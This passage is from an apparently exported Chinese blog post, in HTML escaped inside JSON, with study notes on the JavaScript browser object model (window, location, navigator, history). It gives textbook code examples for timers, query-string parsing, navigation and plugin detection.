class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getQueryStringArgs</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//取得查询字符串并去掉开头的问号</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> qs = location.search.length &gt; <span class=\"number\">0</span> ? location.search.substring(<span class=\"number\">1</span>) : <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"comment\">//保存数据的对象</span></span><br><span class=\"line\">    args = &#123;&#125;,</span><br><span class=\"line\">    <span class=\"comment\">//取得每一项</span></span><br><span class=\"line\">    items = qs.length ? qs.split(<span class=\"string\">\"&amp;\"</span>) : [],</span><br><span class=\"line\">    item = <span class=\"literal\">null</span>,</span><br><span class=\"line\">    name = <span class=\"literal\">null</span>,</span><br><span class=\"line\">    value = <span class=\"literal\">null</span>,</span><br><span class=\"line\">    <span class=\"comment\">//在for 循环中使用</span></span><br><span class=\"line\">    i = <span class=\"number\">0</span>,</span><br><span class=\"line\">    len = items.length;</span><br><span class=\"line\">  <span class=\"comment\">//逐个将每一项添加到args 对象中</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">    item = items[i].split(<span class=\"string\">\"=\"</span>);</span><br><span class=\"line\">    name = <span class=\"built_in\">decodeURIComponent</span>(item[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    value = <span class=\"built_in\">decodeURIComponent</span>(item[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (name.length) &#123;</span><br><span class=\"line\">      args[name] = value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> args;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"位置操作\"><a href=\"#位置操作\" class=\"headerlink\" title=\"位置操作\"></a>位置操作</h3><p>导航到 URL，会生成历史记录，可以后退。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 三种方式等价</span></span><br><span class=\"line\">location.assign(<span class=\"string\">\"http://www.wrox.com\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">window</span>.location = <span class=\"string\">\"http://www.wrox.com\"</span>;</span><br><span class=\"line\">location.href = <span class=\"string\">\"http://www.wrox.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 直接修改属性值也可以</span></span><br><span class=\"line\"><span class=\"comment\">//假设初始URL 为http://www.wrox.com/WileyCDA/</span></span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.wrox.com/WileyCDA/#section1\"</span></span><br><span class=\"line\">location.hash = <span class=\"string\">\"#section1\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.wrox.com/WileyCDA/?q=javascript\"</span></span><br><span class=\"line\">location.search = <span class=\"string\">\"?q=javascript\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.yahoo.com/WileyCDA/\"</span></span><br><span class=\"line\">location.hostname = <span class=\"string\">\"www.yahoo.com\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.yahoo.com/mydir/\"</span></span><br><span class=\"line\">location.pathname = <span class=\"string\">\"mydir\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.yahoo.com:8080/WileyCDA/\"</span></span><br><span class=\"line\">location.port = <span class=\"number\">8080</span>;</span><br></pre></td></tr></table></figure>\n<p>导航到 URL，不会生成历史记录，无法后退。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.replace(<span class=\"string\">\"http://www.wrox.com/\"</span>);</span><br></pre></td></tr></table></figure>\n<p>重新加载当前显示的页面。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.reload(); <span class=\"comment\">//重新加载（有可能从缓存中加载）</span></span><br><span class=\"line\">location.reload(<span class=\"literal\">true</span>); <span class=\"comment\">//重新加载（从服务器重新加载）</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"navigator-对象\"><a href=\"#navigator-对象\" class=\"headerlink\" title=\"navigator 对象\"></a>navigator 对象</h2><p>用于识别客户端浏览器</p>\n<h3 id=\"检测插件\"><a href=\"#检测插件\" class=\"headerlink\" title=\"检测插件\"></a>检测插件</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//检测插件（在IE 中无效）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasPlugin</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  name = name.toLowerCase();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; navigator.plugins.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (navigator.plugins[i].name.toLowerCase().indexOf(name) &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//检测Flash</span></span><br><span class=\"line\">alert(hasPlugin(<span class=\"string\">\"Flash\"</span>));</span><br><span class=\"line\"><span class=\"comment\">//检测QuickTime</span></span><br><span class=\"line\">alert(hasPlugin(<span class=\"string\">\"QuickTime\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//检测IE 中的插件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasIEPlugin</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ActiveXObject(name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//检测Flash</span></span><br><span class=\"line\">alert(hasIEPlugin(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash\"</span>));</span><br><span class=\"line\"><span class=\"comment\">//检测QuickTime</span></span><br><span class=\"line\">alert(hasIEPlugin(<span class=\"string\">\"QuickTime.QuickTime\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//检测所有浏览器中的Flash</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasFlash</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = hasPlugin(<span class=\"string\">\"Flash\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!result) &#123;</span><br><span class=\"line\">    result = hasIEPlugin(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//检测所有浏览器中的QuickTime</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasQuickTime</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = hasPlugin(<span class=\"string\">\"QuickTime\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!result) &#123;</span><br><span class=\"line\">    result = hasIEPlugin(<span class=\"string\">\"QuickTime.QuickTime\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//检测Flash</span></span><br><span class=\"line\">alert(hasFlash());</span><br><span class=\"line\"><span class=\"comment\">//检测QuickTime</span></span><br><span class=\"line\">alert(hasQuickTime());</span><br></pre></td></tr></table></figure>\n<h3 id=\"注册处理程序\"><a href=\"#注册处理程序\" class=\"headerlink\" title=\"注册处理程序\"></a>注册处理程序</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">navigator.registerContentHandler(<span class=\"string\">\"application/rss+xml\"</span>, <span class=\"string\">\"http://www.somereader.com?feed=%s\"</span>, <span class=\"string\">\"Some Reader\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">navigator.registerProtocolHandler(<span class=\"string\">\"mailto\"</span>, <span class=\"string\">\"http://www.somemailclient.com?cmd=%s\"</span>, <span class=\"string\">\"Some Mail Client\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"screen-对象\"><a href=\"#screen-对象\" class=\"headerlink\" title=\"screen 对象\"></a>screen 对象</h2><p>保存着与客户端显示器有关的信息，这些信息一般只用于站点分析。</p>\n<h2 id=\"history-对象\"><a href=\"#history-对象\" class=\"headerlink\" title=\"history 对象\"></a>history 对象</h2><p>判断历史记录的数量<code>history.length</code><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (history.length == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"comment\">//这应该是用户打开窗口后的第一个页面</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>向后或向前导航到任意页面<code>go(),back(),forward()</code><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//后退一页</span></span><br><span class=\"line\">history.go(<span class=\"number\">-1</span>);</span><br><span class=\"line\"><span class=\"comment\">//前进一页</span></span><br><span class=\"line\">history.go(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">//前进两页</span></span><br><span class=\"line\">history.go(<span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//跳转到最近的wrox.com 页面</span></span><br><span class=\"line\">history.go(<span class=\"string\">\"wrox.com\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//跳转到最近的nczonline.net 页面</span></span><br><span class=\"line\">history.go(<span class=\"string\">\"nczonline.net\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//后退一页</span></span><br><span class=\"line\">history.back();</span><br><span class=\"line\"><span class=\"comment\">//前进一页</span></span><br><span class=\"line\">history.forward();</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>BOM（浏览器对象模型），理解window对象，重点掌握location对象和navigator对象的使用。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"window-对象\"><a href=\"#window-对象\" class=\"headerlink\" title=\"window 对象\"></a>window 对象</h2><p>双重角色，既是 JavaScript 访问浏览器窗口的接口，又是 ECMAScript 规定的 Global 对象。</p>\n<h3 id=\"页面视口大小\"><a href=\"#页面视口大小\" class=\"headerlink\" title=\"页面视口大小\"></a>页面视口大小</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 兼容写法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> pageWidth = <span class=\"built_in\">window</span>.innerWidth,</span><br><span class=\"line\">  pageHeight = <span class=\"built_in\">window</span>.innerHeight;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> pageWidth != <span class=\"string\">\"number\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.compatMode == <span class=\"string\">\"CSS1Compat\"</span>) &#123;</span><br><span class=\"line\">    pageWidth = <span class=\"built_in\">document</span>.documentElement.clientWidth;</span><br><span class=\"line\">    pageHeight = <span class=\"built_in\">document</span>.documentElement.clientHeight;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    pageWidth = <span class=\"built_in\">document</span>.body.clientWidth;</span><br><span class=\"line\">    pageHeight = <span class=\"built_in\">document</span>.body.clientHeight;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"窗口关系及框架\"><a href=\"#窗口关系及框架\" class=\"headerlink\" title=\"窗口关系及框架\"></a>窗口关系及框架</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Frameset Example<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">frameset</span> <span class=\"attr\">rows</span>=<span class=\"string\">\"160,*\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">frame</span> <span class=\"attr\">src</span>=<span class=\"string\">\"frame.htm\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"topFrame\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">frameset</span> <span class=\"attr\">cols</span>=<span class=\"string\">\"50%,50%\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">frame</span> <span class=\"attr\">src</span>=<span class=\"string\">\"anotherframe.htm\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"leftFrame\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">frame</span> <span class=\"attr\">src</span>=<span class=\"string\">\"yetanotherframe.htm\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"rightFrame\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">frameset</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">frameset</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>常用属性及方法：<code>window.frames</code>,<code>window.self</code>,<code>window.top</code>,<code>window.parent</code>,<code>window.open()</code></p>\n<h3 id=\"打开窗口\"><a href=\"#打开窗口\" class=\"headerlink\" title=\"打开窗口\"></a>打开窗口</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> blocked = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> wroxWin = <span class=\"built_in\">window</span>.open(<span class=\"string\">\"http://www.wrox.com\"</span>, <span class=\"string\">\"_blank\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (wroxWin == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    blocked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">  blocked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (blocked) &#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"The popup was blocked!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"超时调用-setTimeout\"><a href=\"#超时调用-setTimeout\" class=\"headerlink\" title=\"超时调用 setTimeout()\"></a>超时调用 setTimeout()</h3><p>两个参数：要执行的代码和以毫秒表示的时间。</p>\n<p>第一个参数可以是字符串，可以是函数名，可以是匿名函数体，不推荐字符串写法。</p>\n<p>第二个参数告诉 JavaScript 再过多长时间把当前任务添加到队列中。如果队列是空的，那么添加的代码会立即<br>执行；如果队列不是空的，那么它就要等前面的代码执行完了以后再执行。注意，不要理解成过多长时间执行任务！</p>\n<p>取消超时调用：<code>clearTimeout()</code>。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//推荐的调用方式</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeoutId = setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"Hello world!\"</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\"><span class=\"comment\">//取消</span></span><br><span class=\"line\">clearTimeout(timeoutId);</span><br></pre></td></tr></table></figure>\n<h3 id=\"间歇调用-setInterval\"><a href=\"#间歇调用-setInterval\" class=\"headerlink\" title=\"间歇调用 setInterval()\"></a>间歇调用 setInterval()</h3><p>语法同 setTimeout()。</p>\n<p>取消间歇调用：<code>clearTimeout()</code>。</p>\n<p>实现间歇调用，一般不直接用 setInterval，而是用 setTimeout 实现，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> num = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> max = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">incrementNumber</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  num++;</span><br><span class=\"line\">  <span class=\"comment\">//如果执行次数未达到max 设定的值，则设置另一次超时调用</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (num &lt; max) &#123;</span><br><span class=\"line\">    setTimeout(incrementNumber, <span class=\"number\">500</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    alert(<span class=\"string\">\"Done\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">setTimeout(incrementNumber, <span class=\"number\">500</span>);</span><br></pre></td></tr></table></figure>\n<p>关于 setTimeout 与 setInterval 的进一步分析，请看另外一篇<a href=\"/2018/04/09/JS%E5%8A%A8%E7%94%BB%E4%B9%8B%E5%AE%9A%E6%97%B6%E5%99%A8%E8%AF%A6%E8%A7%A3/\">定时器详解</a></p>\n<h3 id=\"系统对话框\"><a href=\"#系统对话框\" class=\"headerlink\" title=\"系统对话框\"></a>系统对话框</h3><p><code>alert(),onfirm(),prompt(),print(),find()</code></p>\n<h2 id=\"location-对象\"><a href=\"#location-对象\" class=\"headerlink\" title=\"location 对象\"></a>location 对象</h2><p>window.location 和 document.location 引用的是同一个对象。</p>\n<p>location 对象的所有属性: <code>hash,host,hostname,href,pathname,port,protocol,search</code>。</p>\n<h3 id=\"查询字符串参数\"><a href=\"#查询字符串参数\" class=\"headerlink\" title=\"查询字符串参数\"></a>查询字符串参数</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getQueryStringArgs</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//取得查询字符串并去掉开头的问号</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> qs = location.search.length &gt; <span class=\"number\">0</span> ? location.search.substring(<span class=\"number\">1</span>) : <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"comment\">//保存数据的对象</span></span><br><span class=\"line\">    args = &#123;&#125;,</span><br><span class=\"line\">    <span class=\"comment\">//取得每一项</span></span><br><span class=\"line\">    items = qs.length ? qs.split(<span class=\"string\">\"&amp;\"</span>) : [],</span><br><span class=\"line\">    item = <span class=\"literal\">null</span>,</span><br><span class=\"line\">    name = <span class=\"literal\">null</span>,</span><br><span class=\"line\">    value = <span class=\"literal\">null</span>,</span><br><span class=\"line\">    <span class=\"comment\">//在for 循环中使用</span></span><br><span class=\"line\">    i = <span class=\"number\">0</span>,</span><br><span class=\"line\">    len = items.length;</span><br><span class=\"line\">  <span class=\"comment\">//逐个将每一项添加到args 对象中</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">    item = items[i].split(<span class=\"string\">\"=\"</span>);</span><br><span class=\"line\">    name = <span class=\"built_in\">decodeURIComponent</span>(item[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    value = <span class=\"built_in\">decodeURIComponent</span>(item[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (name.length) &#123;</span><br><span class=\"line\">      args[name] = value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> args;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"位置操作\"><a href=\"#位置操作\" class=\"headerlink\" title=\"位置操作\"></a>位置操作</h3><p>导航到 URL，会生成历史记录，可以后退。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 三种方式等价</span></span><br><span class=\"line\">location.assign(<span class=\"string\">\"http://www.wrox.com\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">window</span>.location = <span class=\"string\">\"http://www.wrox.com\"</span>;</span><br><span class=\"line\">location.href = <span class=\"string\">\"http://www.wrox.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 直接修改属性值也可以</span></span><br><span class=\"line\"><span class=\"comment\">//假设初始URL 为http://www.wrox.com/WileyCDA/</span></span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.wrox.com/WileyCDA/#section1\"</span></span><br><span class=\"line\">location.hash = <span class=\"string\">\"#section1\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.wrox.com/WileyCDA/?q=javascript\"</span></span><br><span class=\"line\">location.search = <span class=\"string\">\"?q=javascript\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.yahoo.com/WileyCDA/\"</span></span><br><span class=\"line\">location.hostname = <span class=\"string\">\"www.yahoo.com\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.yahoo.com/mydir/\"</span></span><br><span class=\"line\">location.pathname = <span class=\"string\">\"mydir\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//将URL 修改为\"http://www.yahoo.com:8080/WileyCDA/\"</span></span><br><span class=\"line\">location.port = <span class=\"number\">8080</span>;</span><br></pre></td></tr></table></figure>\n<p>导航到 URL，不会生成历史记录，无法后退。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.replace(<span class=\"string\">\"http://www.wrox.com/\"</span>);</span><br></pre></td></tr></table></figure>\n<p>重新加载当前显示的页面。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 